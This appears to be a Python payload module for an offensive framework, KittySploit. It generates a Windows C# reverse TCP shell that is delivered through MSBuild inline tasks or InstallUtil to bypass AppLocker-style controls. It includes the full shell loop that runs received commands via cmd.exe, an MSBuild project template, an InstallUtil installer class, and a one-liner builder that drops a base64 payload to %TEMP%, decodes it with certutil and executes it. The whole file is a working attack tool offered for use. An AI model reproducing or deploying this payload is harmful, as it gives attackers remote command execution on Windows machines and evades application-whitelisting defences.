from kittysploit import *
import base64


class Module(Payload):

	CLIENT_LANGUAGE = "msbuild"

	__info__ = {
		"name": "Windows MSBuild / InstallUtil Reverse TCP",
		"description": (
			"AppLocker-style bypass: MSBuild inline C# task or InstallUtil-compatible DLL "
			"running a C# reverse shell. Pair with listeners/multi/reverse_tcp."
		),
		"category": PayloadCategory.CMD,
		"arch": Arch.OTHER,
		"platform": Platform.WINDOWS,
		"listener": "listeners/multi/reverse_tcp",
		"handler": Handler.REVERSE,
		"session_type": SessionType.SHELL,
	}

	lhost = OptString("127.0.0.1", "Connect to IP address", True)
	lport = OptPort(4444, "Connect to port", True)
	method = OptString(
		"msbuild",
		"Delivery method: msbuild | installutil",
		False,
	)
	output = OptString(
		"cmd",
		"Output form: cmd (one-liner) | xml (MSBuild) | cs (InstallUtil C# source)",
		False,
	)

	def _shell_loop_cs(self) -> str:
		host = str(self.lhost)
		port = int(self.lport)
		return (
			"try{var c=new System.Net.Sockets.TcpClient(\"" + host + "\"," + str(port) + ");"
			"var s=c.GetStream();var r=new System.IO.StreamReader(s);var w=new System.IO.StreamWriter(s){AutoFlush=true};"
			"w.WriteLine(\"KittySploit MSBuild shell\");"
			"for(;;){var cmd=r.ReadLine();if(cmd==null)break;cmd=cmd.Trim();if(cmd.Length==0)continue;"
			"if(cmd==\"exit\"||cmd==\"quit\")break;"
			"var p=new System.Diagnostics.ProcessStartInfo(\"cmd.exe\",\"/c \"+cmd);"
			"p.RedirectStandardOutput=true;p.RedirectStandardError=true;p.UseShellExecute=false;p.CreateNoWindow=true;"
			"var x=System.Diagnostics.Process.Start(p);var o=x.StandardOutput.ReadToEnd()+x.StandardError.ReadToEnd();x.WaitForExit();"
			"if(o.Length==0)o=\"[exit \"+x.ExitCode+\"]\\n\";w.Write(o);}}catch{}"
		)

	def _msbuild_xml(self) -> str:
		loop = self._shell_loop_cs()
		return f"""<!-- KittySploit MSBuild reverse shell -->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <UsingTask
    TaskName="KsTask"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="$(MSBuildToolsPath)\\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Reference Include="System" />
      <Reference Include="System.Core" />
      <Code Type="Class" Language="cs">
        <![CDATA[
using System;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;

public class KsTask : Task {{
  public override bool Execute() {{
    {loop}
    return true;
  }}
}}
        ]]>
      </Code>
    </Task>
  </UsingTask>
  <Target Name="Build">
    <KsTask />
  </Target>
</Project>
"""

	def _installutil_cs(self) -> str:
		host = str(self.lhost)
		port = int(self.lport)
		return (
			"using System;using System.Collections;using System.ComponentModel;using System.Configuration.Install;"
			"using System.Diagnostics;using System.IO;using System.Net.Sockets;"
			"[RunInstaller(true)]"
			"public class K : Installer{"
			"public override void Uninstall(IDictionary state){"
			"try{var c=new TcpClient(\"" + host + "\"," + str(port) + ");"
			"var s=c.GetStream();var r=new StreamReader(s);var w=new StreamWriter(s){AutoFlush=true};"
			"w.WriteLine(\"KittySploit InstallUtil shell\");"
			"for(;;){var cmd=r.ReadLine();if(cmd==null)break;cmd=cmd.Trim();if(cmd.Length==0)continue;"
			"if(cmd==\"exit\"||cmd==\"quit\")break;"
			"var p=new ProcessStartInfo(\"cmd.exe\",\"/c \"+cmd);"
			"p.RedirectStandardOutput=true;p.RedirectStandardError=true;p.UseShellExecute=false;p.CreateNoWindow=true;"
			"var x=Process.Start(p);var o=x.StandardOutput.ReadToEnd()+x.StandardError.ReadToEnd();x.WaitForExit();"
			"if(o.Length==0)o=\"[exit \"+x.ExitCode+\"]\\n\";w.Write(o);}}catch{}}}"
		)

	def _cmd_msbuild(self, payload_b64: str, ext: str, run_cmd: str) -> str:
		return (
			'cmd.exe /c "'
			f'echo {payload_b64}>%TEMP%\\ks.{ext}.b64 & '
			f'certutil -decode %TEMP%\\ks.{ext}.b64 %TEMP%\\ks.{ext} >nul & '
			f'{run_cmd}"'
		)

	def generate(self):
		method = str(self.method or "msbuild").strip().lower()
		mode = str(self.output or "cmd").strip().lower()

		if method == "installutil":
			cs = self._installutil_cs()
			if mode == "cs":
				return cs
			if mode != "cmd":
				print_warning("InstallUtil method supports output=cs|cmd; defaulting to cmd.")
			cs_b64 = base64.b64encode(cs.encode("utf-8")).decode("ascii")
			csc64 = r"%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
			csc32 = r"%WINDIR%\Microsoft.NET\Framework\v4.0.30319\csc.exe"
			iu64 = r"%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe"
			iu32 = r"%WINDIR%\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe"
			run = (
				f'(if exist {csc64} ({csc64} /nologo /t:library /out:%TEMP%\\ks_iu.dll %TEMP%\\ks.cs)) & '
				f'(if not exist %TEMP%\\ks_iu.dll if exist {csc32} ({csc32} /nologo /t:library /out:%TEMP%\\ks_iu.dll %TEMP%\\ks.cs)) & '
				f'(if exist {iu64} ({iu64} /logfile= /LogToConsole=false /U %TEMP%\\ks_iu.dll)) & '
				f'(if not exist {iu64} if exist {iu32} ({iu32} /logfile= /LogToConsole=false /U %TEMP%\\ks_iu.dll))'
			)
			return self._cmd_msbuild(cs_b64, "cs", run)

		xml = self._msbuild_xml()
		if mode == "xml":
			return xml
		if mode != "cmd":
			print_warning("MSBuild method supports output=xml|cmd; defaulting to cmd.")
		xml_b64 = base64.b64encode(xml.encode("utf-8")).decode("ascii")
		msb64 = r"%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe"
		msb32 = r"%WINDIR%\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe"
		run = (
			f'(if exist {msb64} ({msb64} /nologo %TEMP%\\ks.xml)) & '
			f'(if not exist {msb64} if exist {msb32} ({msb32} /nologo %TEMP%\\ks.xml))'
		)
		return self._cmd_msbuild(xml_b64, "xml", run)
